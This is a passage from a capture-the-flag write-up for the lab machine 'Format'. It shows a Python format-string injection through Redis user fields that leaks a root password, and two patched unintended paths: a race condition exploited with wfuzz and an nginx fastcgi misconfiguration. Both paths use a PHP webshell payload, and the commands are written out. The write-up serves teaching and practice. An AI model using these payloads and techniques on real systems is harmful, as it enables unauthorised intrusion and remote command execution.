A key derivation function (kdf) is initialized and used to generate an encryption key from the secret and a plaintext salt.

Then the program splits based on if it’s call to provision, deprovision (which isn’t implemented yet), or check.

Provisioning is the only interesting path. It starts by getting the user out of Redis and checking if that user already has a key (exiting if so):

```
#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()

```

Then it generates a key based on a static prefix, the username, the random 40 characters, and the combination of the user’s first and last names:

```
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)

```

It prints the plaintext and encrypted keys to the console, and writes the key to the `keys` file:

```
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

```

### Recover Secret

#### Strategy

The trickiest part here is realizing that I need to recover the hidden secret.

What is working to my benefit is that I control the other variables printed to the screen. [This Stack Exchange answer](https://security.stackexchange.com/a/239661) lays out really nicely how to attack this. [This post](https://levelup.gitconnected.com/when-you-should-not-use-f-strings-in-python-and-what-you-should-use-instead-3b89718757bd) goes into more detail as well.

Because I can control the template, then I can specify what happens in the `format`.

I’ll use my access to Redis to create a user where the last name is an injection like `{license.__init__.__globals__[secret]}`. That will make the format string look like:

```
microblog{username}{license.license}{first-name}{license.__init__.__globals__[secret]}

```

When that gets formatted, it should print the secret.

#### Execute

In Redis, I’ll start with a new user, rooted:

```
redis /var/run/redis/redis.sock> hset rooted username rooted
(integer) 1
redis /var/run/redis/redis.sock> hset rooted first-name "password:"
(integer) 1
redis /var/run/redis/redis.sock> hset rooted last-name "{license.__init__.__globals__[secret]}"
(integer) 1

```

I’ve made the first name `password:` to show easily where the secret starts. Running the script now prints the unencrypted key:

```
cooper@format:~$ sudo license -p rooted

Plaintext license key:
------------------------------------------------------
microblogrooted/%QIQ#0?qCGURyI8}RZrdh>#l^L`P7XbP#n@*'a*password:unCR4ckaBL3Pa$$w0rd

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABkYqXC2Xp3JGFVI__uSfLXpBzX84cyRMkAtN5tYqc3CgN8qGmQ70FWSBwn4RVPgKRVgfh0UqkoXO007-QouG9IaUKUygOQAr5TXp2ItrC5eANNlSpeyC37bi9KRF4nRCW4YmebU2_nr0HC8w9gIVfFo2XyjHkYlACttPbHmlQ61mc-8dE5CP6-bUWLBnIcmHqMXF06

```

The secret is `unCR4ckaBL3Pa$$w0rd`.

### su / SSH

That secret works as the password for root via `su`:

```
cooper@format:~$ su -
Password:
root@format:~#

```

and SSH:

```
oxdf@hacky$ sshpass -p 'unCR4ckaBL3Pa$$w0rd' ssh root@10.10.11.213
...[snip]...
root@format:~#

```

I’m able to grab `root.txt`:

```
root@format:~# cat root.txt
aca96cee************************

```

## Beyond Root - Two Patched Unintendeds

### Background

Format was patched on 23 May 2023, 10 days after it’s initial release:

![image-20230927164055988](https://0xdf.gitlab.io/img/image-20230927164055988.png)

### Race Condition

#### Details

[Early in the box](#file-write-poc), I’ll find I can write arbitrary file to a site’s `/content` directory, but not anywhere else in the web directory. `/content` doesn’t allow the execution of PHP files. If I could write elsewhere, I could write a webshell and get execution much earlier than planned.

The patched issue comes with how the new site is originally provisioned:

```
function addSite($site_name) {
    if(isset($_SESSION['username'])) {
        //check if site already exists
        $scan = glob('/var/www/microblog/*', GLOB_ONLYDIR);
        $taken_sites = array();
        foreach($scan as $site) {
            array_push($taken_sites, substr($site, strrpos($site, '/') + 1));
        }
        if(in_array($site_name, $taken_sites)) {
            header("Location: /dashboard?message=Sorry, that site has already been taken&status=fail");
            exit;
        }
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $redis->LPUSH($_SESSION['username'] . ":sites", $site_name);
        chdir(getcwd() . "/../../../");
        system("chmod +w microblog");
        chdir(getcwd() . "/microblog/");
        if(!is_dir($site_name)) {
            mkdir($site_name, 0700);
        }
        system("cp -r /var/www/microblog-template/* /var/www/microblog/" . $site_name);
        if(is_dir($site_name)) {
            chdir(getcwd() . "/" . $site_name);
        }
        system("chmod +w content");
        chdir(getcwd() . "/../");
        system("chmod 500 " . $site_name);
        chdir(getcwd() . "/../");
        system("chmod -w microblog");
        header("Location: /dashboard?message=Site added successfully!&status=success");
    }
    else {
        header("Location: /dashboard?message=Site not added, authentication failed&status=fail");
    }

```

It makes `microblog` writable, and copies the template into that directory. Then it makes the `content` folder writable, but then steps up and sets the reset of the site not writable.

The issue is that there’s a race condition there. For a very short period of time, there’s a writable directory that will allow PHP to run.

#### Exploit

To exploit this, I’ll use `wfuzz` to send a lot of requests at once to write into a site that doesn’t exist:

```
oxdf@hacky$ wfuzz -u http://10.10.11.213/edit/ -H "Host: race.microblog.htb" -b 'username=rbb8bp6umb0logs0i3sqlcp5kc' -d 'id=../0xdf.php&txt=<?php+system($_REQUEST["cmd"]);+?>&oops=FUZZ' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

```

I haven’t created `race.microblog.htb` yet, but that’s my `Host` header. It’s using my session cookie, and trying to write to the root of that site. I’ve added an `oops` parameter just to have something to `FUZZ` so `wfuzz` will send lots of requests at once. If I try something like `curl` here in a `while true` loop, it’s too slow.

Once I start this running, I’ll create the site. For example, with this `curl` command:

```
oxdf@hacky$ curl -v app.microblog.htb/dashboard/ -b username=rbb8bp6umb0logs0i3sqlcp5kc -d new-blog-name=race

```

While the site is being created, `wfuzz` is throwing _tons_ of requests at it, and one is likely to land while the base directory for `race` is writable. Once the site is created, I’ll kill the `wfuzz` and check. The webshell is there:

![image-20230515180123056](https://0xdf.gitlab.io/img/image-20230515180123056.png)

#### Fix

The code is fixed in the `addSite` function here:

```
function addSite($site_name) {
    if(isset($_SESSION['username'])) {
        //check if site already exists
        $scan = glob('/var/www/microblog/*', GLOB_ONLYDIR);
        $taken_sites = array();
        foreach($scan as $site) {
            array_push($taken_sites, substr($site, strrpos($site, '/') + 1));
        }
        if(in_array($site_name, $taken_sites)) {
            header("Location: /dashboard?message=Sorry, that site has already been taken&status=fail");
            exit;
        }
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');                                                                                                                                                                      $redis->LPUSH($_SESSION['username'] . ":sites", $site_name);
        $tmp_dir = "/tmp/" . generateRandomString(7);
        system("mkdir -m 0700 " . $tmp_dir);
        system("cp -r /var/www/microblog-template/* " . $tmp_dir);
        system("chmod 500 " . $tmp_dir);
        system("chmod +w /var/www/microblog");
        system("cp -rp " . $tmp_dir . " /var/www/microblog/" . $site_name);
        system("chmod -w microblog");
        system ("chmod -R +w " . $tmp_dir);
        system("rm -r " . $tmp_dir);
        header("Location: /dashboard?message=Site added successfully!&status=success");
    }
    else {
        header("Location: /dashboard?message=Site not added, authentication failed&status=fail");
    }
}

```

Now, rather than create the directory in place, it creates the directory in `/tmp`. Then it moves all the files it needs into the directory, and changes the permissions locking it down. Finally, it moves it into place in the web directory. To exploit this race condition now, I’d have to guess the name of the random seven character directory in `/tmp` to write in. Given that there’s 26^7 possible directory names (over eight billion), that’s not possible to brute-force.

### nginx Misconfiguration

#### Details

There’s a similar bypass that abuses how the nginx site was originally configured:

```
server {
        listen 80;
        listen [::]:80;

        root /var/www/microblog/$subdomain;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html index.php;

        server_name ~^(?P<subdomain>.+)\.microblog\.htb$ ;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ ^/content/(?<request_basename>[^/]+)$ {
                add_header Content-Disposition "attachment; filename=$request_basename";
        }

        # pass PHP scripts to FastCGI server
        #
        location ~ \.php$ {
                fastcgi_split_path_info ^(.+\.php)(/.+)$;
                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
                fastcgi_index index.php;
                include fastcgi_params;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        }
}

```

I know I can get a webshell into `/content/0xdf.php`. But trying to visit that will match on this block:

```
        location ~ ^/content/(?<request_basename>[^/]+)$ {
                add_header Content-Disposition "attachment; filename=$request_basename";
        }

```

That will add the `Content-Disposition` and return a file, and since a request can only match on one `location` block, it won’t get to the third one.

The next block is what passes files ending in `.php` to the PHP unix socket for execution. `fastcgi_split_path_info` will split the `path` (everything after the host and optional port) into two using this regex. the two regex capture groups (in `()`) will be saved to `$fastci_script_name` and `$fastcgi_path_info`.

In this case, the regex is `^(.+\.php)(/.+)$;`, which will match something up to the first `.php`, saving that into `$fastcgi_script_name`, and the rest into `$fastcgi_script_info`. The last line in this block, `fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;`, results in calling the absolutely path of the script name derived in the first line.

#### Exploit

To abuse this, I’ll craft a URL that has two `.php` strings. It must:

1. end in `.php` to get passed to PHP via fastcgi.
2. not match on `^/content/(?<request_basename>[^/]+)$` so that it gets execution.
3. have `$fastcgi_script_name` end up as `/content/0xdf.php`.

The trick is to put a `/.php` at the end of the URL, making this:

This satisfies 1 by ending in `.php`. For 2, because there’s another `/`, it doesn’t match. In 3, it will split to the first `.php`, capturing just what I want. The rest is past as part of the parameters.

![image-20230516060547743](https://0xdf.gitlab.io/img/image-20230516060547743.png)

#### Incomplete Fix

To patch this, the server configuration block in `/etc/nginx/sites-enabled/microblog.htb` was updated to:

```
server {
        listen 80;
        listen [::]:80;

        root /var/www/microblog/$subdomain;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html index.php;

        server_name ~^(?P<subdomain>.+)\.microblog\.htb$ ;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~^/content/(?<request_basename>[^/]+)(/\.php)*$ {
                add_header Content-Disposition "attachment; filename=$request_basename";
        }

        # pass PHP scripts to FastCGI server
        #
        location ~ \.php$ {
                fastcgi_split_path_info ^(.+\.php)(/.+)$;
                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
                fastcgi_index index.php;
                include fastcgi_params;
                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        }

```

The fix here is less complete. It now looks for any number of `/.php` on the end and still sends handles that as an attachment. But it doesn’t allow for extra stuff before the `/.php`. So even today while the exact URL originally used to unintended the box is blocked:

![image-20230927202511903](https://0xdf.gitlab.io/img/image-20230927202511903.png)

Any variation that appends anything besides `/.php` still work:

![image-20230927202328665](https://0xdf.gitlab.io/img/image-20230927202328665.png)





